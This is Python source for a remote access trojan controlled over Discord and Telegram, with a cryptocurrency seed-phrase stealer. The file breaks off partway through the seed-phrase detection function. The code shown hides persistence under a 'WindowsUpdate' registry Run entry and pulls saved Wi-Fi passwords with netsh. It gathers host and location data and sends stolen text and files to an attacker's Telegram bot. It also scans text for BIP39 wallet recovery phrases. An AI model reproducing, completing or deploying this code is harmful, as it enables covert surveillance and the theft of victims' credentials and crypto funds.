# ============================================================
# COMPLETE RAT - Discord/Telegram Control with Seed Phrase Stealer
# ============================================================

import os
import discord
from discord.ext import commands
import asyncio
import sys
import subprocess
import time
import pyautogui
import psutil
import pygetwindow as gw
from datetime import datetime
from typing import Optional
import random
import string
import ctypes
import threading
import pyttsx3
import platform
import uuid
import socket
import re
import requests
import winreg
import base64
import atexit
import win32clipboard
import cv2
import shutil
import glob
import json
import sqlite3
import win32crypt
from PIL import ImageGrab
import certifi
import ssl
import tempfile

if getattr(sys, 'frozen', False):
    os.environ['SSL_CERT_FILE'] = certifi.where()
    os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
    ssl._create_default_https_context = ssl._create_unverified_context

try:
    from Crypto.Cipher import AES
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    AES = None

try:
    import pyaudio
    import wave
    AUDIO_AVAILABLE = True
except ImportError:
    AUDIO_AVAILABLE = False
    pyaudio = None
    wave = None

if platform.system() != "Windows":
    sys.exit(0)

dir = os.path.dirname(os.path.abspath(__file__))
lock = os.path.join(dir, ".lock")
if os.path.exists(lock):
    sys.exit(0)
open(lock, "w").close()

running = True
keylog_active = False
keylog_file = os.environ['TEMP'] + "\\syslog.txt"
critical_mode = False
shake_active = False

def cleanup():
    global running
    running = False
    if os.path.exists(lock):
        os.remove(lock)
atexit.register(cleanup)

def keep_lock_alive():
    while running:
        if not os.path.exists(lock):
            open(lock, "w").close()
        time.sleep(0.1)
threading.Thread(target=keep_lock_alive, daemon=True).start()

# ============================================================
# COLORS
# ============================================================

class Colors:
    RESET = "\033[0m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    BLUE = "\033[94m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    MAGENTA = "\033[95m"
    BOLD = "\033[1m"

# ============================================================
# CLEAR SCREEN FUNCTION
# ============================================================

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# ============================================================
# STARTUP SELECTION MENU
# ============================================================

def select_delivery_method():
    """Show menu to choose delivery method on startup"""
    clear_screen()
    print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
{Colors.YELLOW}║{Colors.WHITE}         SELECT DELIVERY METHOD                     {Colors.YELLOW}║
{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
    {Colors.GREEN}[1]{Colors.WHITE} Discord Only
    {Colors.GREEN}[2]{Colors.WHITE} Telegram Only
    {Colors.GREEN}[3]{Colors.WHITE} Both (Discord + Telegram)
    {Colors.GREEN}[4]{Colors.WHITE} Discord with Telegram Backup
    {Colors.GREEN}[5]{Colors.WHITE} Telegram with Discord Backup
    {Colors.GREEN}[6]{Colors.WHITE} Show Config Status
""")
    
    choice = input(f"{Colors.CYAN}[>]{Colors.WHITE} Choice (1-6): {Colors.RESET}").strip()
    
    methods = {
        "1": "discord",
        "2": "telegram",
        "3": "both",
        "4": "discord_backup",
        "5": "telegram_backup"
    }
    
    if choice == "6":
        clear_screen()
        print(f"""
{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{Config.WHITELISTED if Config.WHITELISTED else 'Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{Config.MAIN_CHANNEL if Config.MAIN_CHANNEL else 'Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{Config.TELEGRAM_CHAT_ID if Config.TELEGRAM_CHAT_ID else 'Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Current Delivery: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
{Colors.YELLOW}═══════════════════════════════════════════════════════════════════
""")
        input(f"{Colors.CYAN}[>]{Colors.WHITE} Press Enter to continue...{Colors.RESET}")
        return select_delivery_method()
    
    return methods.get(choice, "discord")

# ============================================================
# CONFIG
# ============================================================

class Config:
    TOKEN = "{placeholder_token}"
    WHITELISTED = [{placeholder_whitelist}]
    MAIN_CHANNEL = {placeholder_main_channel}
    PREFIX = "{placeholder_prefix}"
    STARTUP = {placeholder_add_to_startup}
    # Telegram config
    TELEGRAM_BOT_TOKEN = ""  # Set your bot token here
    TELEGRAM_CHAT_ID = ""    # Set your chat ID here
    DELIVERY_METHOD = "discord"  # "discord", "telegram", "both", etc.

# ============================================================
# TELEGRAM DELIVERY FUNCTIONS
# ============================================================

def send_to_telegram(message, file_path=None):
    """Send message/file via Telegram bot"""
    if not Config.TELEGRAM_BOT_TOKEN or not Config.TELEGRAM_CHAT_ID:
        return False
    
    try:
        url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": Config.TELEGRAM_CHAT_ID,
            "text": message[:4000],
            "parse_mode": "HTML"
        }
        requests.post(url, json=payload, timeout=10)
        
        if file_path and os.path.exists(file_path):
            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendDocument"
            with open(file_path, 'rb') as f:
                files = {'document': f}
                data = {'chat_id': Config.TELEGRAM_CHAT_ID}
                requests.post(url, files=files, data=data, timeout=30)
        return True
    except:
        return False

def send_results_telegram(title, content, file_path=None):
    """Send results via Telegram"""
    send_to_telegram(f"<b>{title}</b>\n\n{content[:4000]}", file_path)

# ============================================================
# DELIVERY ROUTER
# ============================================================

def send_results(title, content, file_path=None):
    """Send results based on delivery method"""
    sent = False
    
    # Send to Discord
    if Config.DELIVERY_METHOD in ["discord", "both", "discord_backup"]:
        try:
            # Discord embed logic (handled in command)
            sent = True
        except:
            if Config.DELIVERY_METHOD == "discord_backup":
                send_to_telegram(f"⚠️ Discord failed, using backup\n\n<b>{title}</b>\n\n{content}", file_path)
    
    # Send to Telegram
    if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"]:
        try:
            send_to_telegram(f"<b>{title}</b>\n\n{content}", file_path)
            sent = True
        except:
            if Config.DELIVERY_METHOD == "telegram_backup":
                pass  # Fallback to Discord handled in command
    
    return sent

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=Config.PREFIX, intents=intents)
bot.remove_command("help")

current_path = os.environ['SYSTEMDRIVE'] + "\\"

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def add_to_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
        return True
    except:
        return False

def get_displayname():
    try:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3
        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)
        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)
        return nameBuffer.value
    except:
        return platform.node()

def get_hwid():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID"'
        result = subprocess.check_output(cmd, shell=True).decode().strip()
        return result if result else str(uuid.getnode())
    except:
        return str(uuid.getnode())

def get_cpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_Processor | Select-Object -ExpandProperty Name"'
        cpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return cpu if cpu else platform.processor() or "N/A"
    except:
        return platform.processor() or "N/A"

def get_gpuinfo():
    try:
        cmd = 'powershell -Command "Get-CimInstance -ClassName Win32_VideoController | Select-Object -ExpandProperty Name"'
        gpu = subprocess.check_output(cmd, shell=True).decode().strip()
        return gpu.split('\n')[0] if gpu else "N/A"
    except:
        return "N/A"

def get_raminfo():
    ram = psutil.virtual_memory()
    return f"{ram.total / (1024**3):.2f} GB"

def get_disks():
    disks = []
    for partition in psutil.disk_partitions():
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            disks.append({'drive': partition.device, 'free': f"{usage.free / (1024**3):.2f}", 'total': f"{usage.total / (1024**3):.2f}", 'percent': usage.percent})
        except:
            pass
    return disks

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "N/A"

def get_ipinfo():
    try:
        response = requests.get('http://ip-api.com/json/', timeout=5)
        if response.status_code == 200:
            data = response.json()
            return {'ip': data.get('query', 'N/A'), 'country': data.get('country', 'N/A'), 'region': data.get('regionName', 'N/A'), 'city': data.get('city', 'N/A'), 'isp': data.get('isp', 'N/A')}
    except:
        pass
    return {'ip': get_local_ip(), 'country': 'N/A', 'region': 'N/A', 'city': 'N/A', 'isp': 'N/A'}

def get_macaddress():
    try:
        return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    except:
        return "N/A"

def get_wifipasswords():
    profiles = []
    try:
        networks = subprocess.check_output('netsh wlan show profiles', shell=True).decode('utf-8', errors='ignore')
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', networks)
        for name in profile_names:
            name = name.strip()
            try:
                info = subprocess.check_output(f'netsh wlan show profile "{name}" key=clear', shell=True).decode('utf-8', errors='ignore')
                password_match = re.search(r'Key Content\s*:\s*(.*)', info)
                profiles.append({'name': name, 'password': password_match.group(1).strip() if password_match else "N/A"})
            except:
                profiles.append({'name': name, 'password': "N/A"})
    except:
        pass
    return profiles

def get_folder_path(folder_name):
    folder_map = {
        'downloads': "{374DE290-123F-4565-9164-39C4925E467B}",
        'documents': "Personal",
        'pictures': "My Pictures",
        'music': "My Music",
        'videos': "My Video",
        'desktop': "Desktop"
    }
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
        path = winreg.QueryValueEx(key, folder_map[folder_name])[0]
        winreg.CloseKey(key)
        if os.path.exists(path):
            return path
    except:
        pass
    return os.path.join(os.path.expanduser('~'), folder_name.capitalize())

# ============================================================
# BIP39 WORDLIST FOR SEED PHRASE DETECTION
# ============================================================

BIP39_WORDS = [
    "abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", 
    "absurd", "abuse", "access", "accident", "account", "accuse", "achieve", "acid",
    "acoustic", "acquire", "across", "act", "action", "actor", "actress", "actual",
    "adapt", "add", "addict", "address", "adjust", "admit", "adult", "advance",
    "advice", "aerobic", "affair", "afford", "afraid", "again", "age", "agent",
    "agree", "ahead", "aim", "air", "airport", "aisle", "alarm", "album", "alcohol",
    "alert", "alien", "all", "alley", "allow", "almost", "alone", "alpha", "already",
    "also", "alter", "always", "amateur", "amazing", "among", "amount", "amused",
    "analyst", "anchor", "ancient", "anger", "angle", "angry", "animal", "ankle",
    "announce", "annual", "another", "answer", "antenna", "antique", "anxiety", "any",
    "apart", "apology", "appear", "apple", "approve", "april", "arch", "arctic",
    "area", "arena", "argue", "arm", "armed", "armor", "army", "around", "arrange",
    "arrest", "arrive", "arrow", "art", "artefact", "artist", "artwork", "ask",
    "aspect", "assault", "asset", "assist", "assume", "asthma", "athlete", "atom",
    "attack", "attend", "attitude", "attract", "auction", "audit", "august", "aunt",
    "author", "auto", "autumn", "average", "avocado", "avoid", "awake", "aware",
    "away", "awesome", "awful", "awkward", "axis", "baby", "bachelor", "bacon",
    "badge", "bag", "balance", "balcony", "ball", "bamboo", "banana", "banner",
    "bar", "barely", "bargain", "barrel", "base", "basic", "basket", "battle",
    "beach", "bean", "beauty", "because", "become", "beef", "before", "begin",
    "behave", "behind", "believe", "below", "belt", "bench", "benefit", "best",
    "betray", "better", "between", "beyond", "bicycle", "bid", "bike", "bind",
    "biology", "bird", "birth", "bitter", "black", "blade", "blame", "blanket",
    "blast", "bleak", "bless", "blind", "blood", "blossom", "blouse", "blue",
    "blur", "blush", "board", "boat", "body", "boil", "bomb", "bone", "bonus",
    "book", "boost", "border", "boring", "borrow", "boss", "bottom", "bounce",
    "box", "boy", "bracket", "brain", "brand", "brass", "brave", "bread", "breeze",
    "brick", "bridge", "brief", "bright", "bring", "brisk", "broccoli", "broken",
    "bronze", "broom", "brother", "brown", "brush", "bubble", "buddy", "budget",
    "buffalo", "build", "bulb", "bulk", "bullet", "bundle", "bunker", "burden",
    "burger", "burst", "bus", "business", "busy", "butter", "buyer", "buzz",
    "cabbage", "cabin", "cable", "cactus", "cage", "cake", "call", "calm",
    "camera", "camp", "can", "canal", "cancel", "candy", "cannon", "canoe",
    "canvas", "canyon", "capable", "capital", "captain", "car", "carbon", "card",
    "cargo", "carpet", "carry", "cart", "case", "cash", "casino", "castle", "casual",
    "cat", "catalog", "catch", "category", "cattle", "caught", "cause", "caution",
    "cave", "ceiling", "celery", "cement", "census", "century", "cereal", "certain",
    "chair", "chalk", "champion", "change", "chaos", "chapter", "charge", "chase",
    "chat", "cheap", "check", "cheese", "chef", "cherry", "chest", "chicken",
    "chief", "child", "chimney", "choice", "choose", "chronic", "chuckle", "chunk",
    "churn", "cigar", "cinnamon", "circle", "citizen", "city", "civil", "claim",
    "clap", "clarify", "claw", "clay", "clean", "clerk", "clever", "click", "client",
    "cliff", "climb", "clinic", "clip", "clock", "clog", "close", "cloth", "cloud",
    "clown", "club", "clump", "cluster", "clutch", "coach", "coast", "coconut",
    "code", "coffee", "coil", "coin", "collect", "color", "column", "combine",
    "come", "comfort", "comic", "common", "company", "concert", "conduct", "confirm",
    "congress", "connect", "consider", "control", "convince", "cook", "cool",
    "copper", "copy", "coral", "core", "corn", "correct", "cost", "cotton", "couch",
    "country", "couple", "course", "cousin", "cover", "coyote", "crack", "cradle",
    "craft", "cram", "crane", "crash", "crater", "crawl", "crazy", "cream", "credit",
    "creek", "crew", "cricket", "crime", "crisp", "critic", "crop", "cross", "crouch",
    "crowd", "crucial", "cruel", "cruise", "crumble", "crunch", "crush", "cry",
    "crystal", "cube", "culture", "cup", "cupboard", "curious", "current", "curtain",
    "curve", "cushion", "custom", "cute", "cycle", "dad", "damage", "damp", "dance",
    "danger", "daring", "dash", "daughter", "dawn", "day", "deal", "debate", "debris",
    "decade", "december", "decide", "decline", "decorate", "decrease", "deer", "defense",
    "define", "defy", "degree", "delay", "deliver", "demand", "demise", "denial",
    "dentist", "deny", "depart", "depend", "deposit", "depth", "deputy", "derive",
    "describe", "desert", "design", "desk", "despair", "destroy", "detail", "detect",
    "develop", "device", "devote", "diagram", "dial", "diamond", "diary", "dice",
    "diesel", "diet", "differ", "digital", "dignity", "dilemma", "dinner", "dinosaur",
    "direct", "dirt", "disagree", "discover", "disease", "dish", "dismiss", "disorder",
    "display", "distance", "divert", "divide", "divorce", "dizzy", "doctor", "document",
    "dog", "doll", "dolphin", "domain", "donate", "donkey", "donor", "door", "dose",
    "double", "dove", "draft", "dragon", "drama", "drastic", "draw", "dream", "dress",
    "drift", "drill", "drink", "drip", "drive", "drop", "drum", "dry", "duck", "dumb",
    "dune", "during", "dust", "dutch", "duty", "dwarf", "dynamic", "eager", "eagle",
    "early", "earn", "earth", "easily", "east", "easy", "echo", "ecology", "economy",
    "edge", "edit", "educate", "effort", "egg", "eight", "either", "elbow", "elder",
    "electric", "elegant", "element", "elephant", "elevator", "elite", "else", "embark",
    "embody", "embrace", "emerge", "emotion", "employ", "empower", "empty", "enable",
    "enact", "end", "endless", "endorse", "enemy", "energy", "enforce", "engage",
    "engine", "enhance", "enjoy", "enlist", "enough", "enrich", "enroll", "ensure",
    "enter", "entire", "entry", "envelope", "episode", "equal", "equip", "era",
    "erase", "erode", "erosion", "error", "erupt", "escape", "essay", "essence",
    "estate", "eternal", "ethics", "evidence", "evil", "evoke", "evolve", "exact",
    "example", "excess", "exchange", "excite", "exclude", "excuse", "execute", "exercise",
    "exhaust", "exhibit", "exile", "exist", "exit", "exotic", "expand", "expect",
    "expire", "explain", "expose", "express", "extend", "extra", "eye", "eyebrow",
    "fabric", "face", "faculty", "fade", "faint", "faith", "fall", "false", "fame",
    "family", "famous", "fan", "fancy", "fantasy", "farm", "fashion", "fat", "fatal",
    "father", "fatigue", "fault", "favorite", "feature", "february", "federal", "fee",
    "feed", "feel", "female", "fence", "festival", "fetch", "fever", "few", "fiber",
    "fiction", "field", "figure", "file", "film", "filter", "final", "find", "fine",
    "finger", "finish", "fire", "firm", "first", "fiscal", "fish", "fit", "fitness",
    "fix", "flag", "flame", "flash", "flat", "flavor", "flee", "flight", "flip",
    "float", "flock", "floor", "flower", "fluid", "flush", "fly", "foam", "focus",
    "fog", "foil", "fold", "follow", "food", "foot", "force", "forest", "forget",
    "fork", "fortune", "forum", "forward", "fossil", "foster", "found", "fox", "fragile",
    "frame", "frequent", "fresh", "friend", "fringe", "frog", "front", "frost", "frown",
    "frozen", "fruit", "fuel", "fun", "funny", "furnace", "fury", "future", "gadget",
    "gain", "galaxy", "gallery", "game", "gap", "garage", "garbage", "garden", "garlic",
    "garment", "gas", "gasp", "gate", "gather", "gauge", "gaze", "general", "genius",
    "genre", "gentle", "genuine", "gesture", "ghost", "giant", "gift", "giggle",
    "ginger", "giraffe", "girl", "give", "glad", "glance", "glare", "glass", "glide",
    "glimpse", "globe", "gloom", "glory", "glove", "glow", "glue", "goat", "goddess",
    "gold", "good", "goose", "gorilla", "gospel", "gossip", "govern", "gown", "grab",
    "grace", "grain", "grant", "grape", "grass", "gravity", "great", "green", "grid",
    "grief", "grit", "grocery", "group", "grow", "grunt", "guard", "guess", "guide",
    "guilt", "guitar", "gun", "gym", "habit", "hair", "half", "hammer", "hamster",
    "hand", "happy", "harbor", "hard", "harsh", "harvest", "hat", "have", "hawk",
    "hazard", "head", "health", "heart", "heavy", "hedgehog", "height", "hello",
    "helmet", "help", "hen", "hero", "hidden", "high", "hill", "hint", "hip", "hire",
    "history", "hobby", "hockey", "hold", "hole", "holiday", "hollow", "home", "honey",
    "hood", "hope", "horn", "horror", "horse", "hospital", "host", "hotel", "hour",
    "hover", "hub", "huge", "human", "humble", "humor", "hundred", "hungry", "hunt",
    "hurdle", "hurry", "hurt", "husband", "hybrid", "ice", "icon", "idea", "identify",
    "idle", "ignore", "ill", "illegal", "illness", "image", "imitate", "immense",
    "immune", "impact", "impose", "improve", "impulse", "inch", "include", "income",
    "increase", "index", "indicate", "indoor", "industry", "infant", "inflict",
    "inform", "inhale", "inherit", "initial", "inject", "injury", "inmate", "inner",
    "innocent", "input", "inquiry", "insane", "insect", "inside", "inspire", "install",
    "intact", "interest", "into", "invest", "invite", "involve", "iron", "island",
    "isolate", "issue", "item", "ivory", "jacket", "jaguar", "jar", "jazz", "jealous",
    "jeans", "jelly", "jewel", "job", "join", "joke", "journey", "joy", "judge",
    "juice", "jump", "jungle", "junior", "junk", "just", "kangaroo", "keen", "keep",
    "ketchup", "key", "kick", "kid", "kidney", "kind", "kingdom", "kiss", "kit",
    "kitchen", "kite", "kitten", "kiwi", "knee", "knife", "knock", "know", "lab",
    "label", "labor", "ladder", "lady", "lake", "lamp", "language", "laptop", "large",
    "later", "latin", "laugh", "laundry", "lava", "law", "lawn", "lawsuit", "layer",
    "lazy", "leader", "leaf", "learn", "leave", "lecture", "left", "leg", "legal",
    "legend", "leisure", "lemon", "lend", "length", "lens", "leopard", "lesson",
    "letter", "level", "liar", "liberty", "library", "license", "life", "lift",
    "light", "like", "limb", "limit", "link", "lion", "liquid", "list", "little",
    "live", "lizard", "load", "loan", "lobster", "local", "lock", "logic", "lonely",
    "long", "loop", "lottery", "loud", "lounge", "love", "loyal", "lucky", "luggage",
    "lumber", "lunar", "lunch", "luxury", "lyrics", "machine", "mad", "magic",
    "magnet", "maid", "mail", "main", "major", "make", "mammal", "man", "manage",
    "mandate", "mango", "mansion", "manual", "maple", "marble", "march", "margin",
    "marine", "market", "marriage", "mask", "mass", "master", "match", "material",
    "math", "matrix", "matter", "maximum", "maze", "meadow", "mean", "measure",
    "meat", "mechanic", "medal", "media", "melody", "melt", "member", "memory",
    "mention", "menu", "mercy", "merge", "merit", "merry", "mesh", "message", "metal",
    "method", "middle", "midnight", "milk", "million", "mimic", "mind", "mineral",
    "minimum", "minor", "minute", "miracle", "mirror", "misery", "miss", "mistake",
    "mix", "mixed", "mixture", "mobile", "model", "modify", "mom", "moment", "monitor",
    "monkey", "monster", "month", "moon", "moral", "more", "morning", "mosquito",
    "mother", "motion", "motor", "mountain", "mouse", "move", "movie", "much", "muffin",
    "mule", "multiply", "muscle", "museum", "mushroom", "music", "must", "mutual",
    "myself", "mystery", "myth", "naive", "name", "napkin", "narrow", "nasty", "nation",
    "nature", "near", "neck", "need", "negative", "neglect", "neither", "nephew", "nerve",
    "nest", "net", "network", "neutral", "never", "news", "next", "nice", "night", "noble",
    "noise", "nominee", "noodle", "normal", "north", "nose", "notable", "note", "nothing",
    "notice", "novel", "now", "nuclear", "number", "nurse", "nut", "oak", "obey", "object",
    "oblige", "obscure", "observe", "obtain", "obvious", "occur", "ocean", "october", "odor",
    "off", "offer", "office", "often", "oil", "okay", "old", "olive", "olympic", "omit",
    "once", "one", "onion", "online", "only", "open", "opera", "opinion", "oppose", "option",
    "orange", "orbit", "orchard", "order", "ordinary", "organ", "orient", "original", "orphan",
    "ostrich", "other", "outdoor", "outer", "output", "outside", "oval", "oven", "over",
    "own", "owner", "oxygen", "oyster", "ozone", "pact", "paddle", "page", "pair", "palace",
    "palm", "panda", "panel", "panic", "panther", "paper", "parade", "parent", "park", "parrot",
    "party", "pass", "patch", "path", "patient", "patrol", "pattern", "pause", "pave", "payment",
    "peace", "peanut", "pear", "peasant", "pelican", "pen", "penalty", "pencil", "people",
    "pepper", "perfect", "permit", "person", "pet", "phone", "photo", "phrase", "physical",
    "piano", "picnic", "picture", "piece", "pig", "pigeon", "pill", "pilot", "pink", "pioneer",
    "pipe", "pirate", "pistol", "pitch", "pizza", "place", "planet", "plastic", "plate", "play",
    "please", "pledge", "pluck", "plug", "plunge", "poem", "poet", "point", "polar", "pole",
    "police", "pond", "pony", "pool", "popular", "portion", "position", "possible", "post",
    "potato", "pottery", "poverty", "powder", "power", "practice", "praise", "predict", "prefer",
    "prepare", "present", "pretty", "prevent", "price", "pride", "primary", "print", "priority",
    "prison", "private", "prize", "problem", "process", "produce", "profit", "program", "project",
    "promote", "proof", "property", "prosper", "protect", "proud", "provide", "public", "pudding",
    "pull", "pulp", "pulse", "pumpkin", "punch", "pupil", "puppy", "purchase", "purity", "purpose",
    "purse", "push", "put", "puzzle", "pyramid", "quality", "quantum", "quarter", "question", "quick",
    "quit", "quiz", "quote", "rabbit", "raccoon", "race", "rack", "radar", "radio", "rail", "rain",
    "raise", "rally", "ramp", "ranch", "random", "range", "rapid", "rare", "rate", "rather", "raven",
    "raw", "razor", "ready", "real", "reason", "rebel", "rebuild", "recall", "receive", "recipe",
    "record", "recycle", "reduce", "reflect", "reform", "refuse", "region", "regret", "regular",
    "reject", "relax", "release", "relief", "rely", "remain", "remember", "remind", "remove", "render",
    "renew", "rent", "reopen", "repair", "repeat", "replace", "report", "require", "rescue", "resemble",
    "resist", "resource", "response", "result", "retire", "retreat", "return", "reunion", "reveal",
    "review", "revolt", "reward", "rhythm", "rib", "ribbon", "rice", "rich", "ride", "ridge", "rifle",
    "right", "rigid", "ring", "riot", "ripple", "risk", "ritual", "rival", "river", "road", "roast",
    "robot", "robust", "rocket", "romance", "roof", "rookie", "room", "rose", "rotate", "rough",
    "round", "route", "royal", "rubber", "rude", "rug", "rule", "run", "runway", "rural", "sad",
    "saddle", "sadness", "safe", "sail", "salad", "salmon", "salon", "salt", "salute", "same", "sample",
    "sand", "satisfy", "satoshi", "sauce", "sausage", "save", "say", "scale", "scan", "scare", "scatter",
    "scene", "scheme", "school", "science", "scissors", "scorpion", "scout", "scrap", "screen", "script",
    "scrub", "sea", "search", "season", "seat", "second", "secret", "section", "security", "seed",
    "seek", "segment", "select", "sell", "seminar", "senior", "sense", "sentence", "series", "service",
    "session", "settle", "setup", "seven", "shadow", "shaft", "shallow", "share", "shed", "shell", "sheriff",
    "shield", "shift", "shine", "ship", "shiver", "shock", "shoe", "shoot", "shop", "short", "shoulder",
    "shove", "shrimp", "shrug", "shuffle", "shy", "sibling", "sick", "side", "siege", "sight", "sign",
    "silent", "silk", "silly", "silver", "similar", "simple", "since", "sing", "siren", "sister", "situate",
    "six", "size", "skate", "sketch", "ski", "skill", "skin", "skirt", "skull", "slab", "slam", "sleep",
    "slender", "slice", "slide", "slight", "slim", "slogan", "slot", "slow", "slush", "small", "smart",
    "smile", "smoke", "smooth", "snack", "snake", "snap", "sniff", "snow", "soap", "soccer", "social",
    "sock", "soda", "soft", "solar", "soldier", "solid", "solution", "solve", "someone", "song", "soon",
    "sorry", "sort", "soul", "sound", "soup", "source", "south", "space", "spare", "spatial", "spawn",
    "speak", "special", "speed", "spell", "spend", "sphere", "spice", "spider", "spike", "spin", "spirit",
    "split", "spoil", "sponsor", "spoon", "sport", "spot", "spray", "spread", "spring", "spy", "square",
    "squeeze", "squirrel", "stable", "stadium", "staff", "stage", "stairs", "stamp", "stand", "start",
    "state", "stay", "steak", "steel", "stem", "step", "stereo", "stick", "still", "sting", "stock",
    "stomach", "stone", "stool", "story", "stove", "strategy", "street", "strike", "strong", "struggle",
    "student", "stuff", "stumble", "style", "subject", "submit", "subway", "success", "such", "sudden",
    "suffer", "sugar", "suggest", "suit", "summer", "sun", "sunny", "sunset", "super", "supply", "supreme",
    "sure", "surface", "surge", "surprise", "surround", "survey", "suspect", "sustain", "swallow", "swamp",
    "swap", "swarm", "swear", "sweet", "swift", "swim", "swing", "switch", "sword", "symbol", "symptom",
    "syrup", "system", "table", "tackle", "tag", "tail", "talent", "talk", "tank", "tape", "target", "task",
    "taste", "tattoo", "taxi", "teach", "team", "tell", "ten", "tenant", "tennis", "tent", "term", "test",
    "text", "thank", "that", "theme", "then", "theory", "there", "they", "thing", "this", "thought", "three",
    "thrive", "throw", "thumb", "thunder", "ticket", "tide", "tiger", "tilt", "timber", "time", "tiny",
    "tip", "tired", "tissue", "title", "toast", "tobacco", "today", "toddler", "toe", "together", "toilet",
    "token", "tomato", "tomorrow", "tone", "tongue", "tonight", "tool", "tooth", "top", "topic", "topple",
    "torch", "tornado", "tortoise", "toss", "total", "tourist", "toward", "tower", "town", "toy", "track",
    "trade", "traffic", "tragic", "train", "transfer", "trap", "trash", "travel", "tray", "treat", "tree",
    "trend", "trial", "tribe", "trick", "trigger", "trim", "trip", "trophy", "trouble", "truck", "true",
    "truly", "trumpet", "trust", "truth", "try", "tube", "tuition", "tumble", "tuna", "tunnel", "turkey",
    "turn", "turtle", "twelve", "twenty", "twice", "twin", "twist", "two", "type", "typical", "ugly",
    "umbrella", "unable", "unaware", "uncle", "uncover", "under", "undo", "unfair", "unfold", "unhappy",
    "uniform", "unique", "unit", "universe", "unknown", "unlock", "until", "unusual", "unveil", "update",
    "upgrade", "uphold", "upon", "upper", "upset", "urban", "urge", "usage", "use", "used", "useful",
    "useless", "usual", "utility", "vacant", "vacuum", "vague", "valid", "valley", "valve", "van", "vanish",
    "vapor", "various", "vast", "vault", "vehicle", "velvet", "vendor", "venture", "venue", "verb", "verify",
    "version", "very", "vessel", "veteran", "viable", "vibrant", "vicious", "victory", "video", "view", "village",
    "vintage", "violin", "virtual", "virus", "visa", "visit", "visual", "vital", "vivid", "vocal", "voice",
    "void", "volcano", "volume", "vote", "voyage", "wage", "wagon", "wait", "walk", "wall", "walnut", "want",
    "warfare", "warm", "warrior", "wash", "wasp", "waste", "water", "wave", "way", "wealth", "weapon", "wear",
    "weasel", "weather", "web", "wedding", "weekend", "weird", "welcome", "west", "wet", "whale", "what", "wheat",
    "wheel", "when", "where", "whip", "whisper", "wide", "width", "wife", "wild", "will", "win", "window", "wine",
    "wing", "wink", "winner", "winter", "wire", "wisdom", "wise", "wish", "witness", "wolf", "woman", "wonder",
    "wood", "wool", "word", "work", "world", "worry", "worth", "wrap", "wreck", "wrestle", "wrist", "write", "wrong",
    "yard", "year", "yellow", "you", "young", "youth", "zebra", "zero", "zone", "zoo"
]

BIP39_SET = set(BIP39_WORDS)

# ============================================================
# SEED PHRASE DETECTION
# ============================================================

def find_seed_phrases(text):
    """Find BIP39 seed phrases (12 or 24 words) in text"""
    found_phrases = []
    words = re.findall(r'\b[a-zA-Z]{3,10}\b', text.lower())
    
    # Check for 12-word phrase
    for i in range(len(words) - 11):
        phrase = words[i:i+12]
        if all(w in BIP39_SET for w in phrase):
            found_phrases.append((' '.join(phrase), 12))
    
    # Check for 24-word phrase
    for i in range(len(words) - 23):
        phrase = words[i:i+24]
        if all(w in BIP39_SET for w in phrase):
            found_phrases.append((' '.join(phrase), 24))
    
    # Check for seed phrase markers
    seed_markers = [
        'mnemonic', 'seed phrase', 'recovery phrase', 'backup phrase',
        'wallet seed', 'recovery seed', '12 word', '24 word',
        'secret phrase', 'passphrase', 'seed words'
    ]
    for marker in seed_markers:
        if marker in text.lower():
            lines = text.split('\n')
            for line in lines:
                if marker in line.lower():
                    words_in_line = re.findall(r'\b[a-zA-Z]{3,10}\b', line.lower())
                    if len(words_in_line) >= 12:
                        if all(w in BIP39_SET for w in words_in_line[:12]):
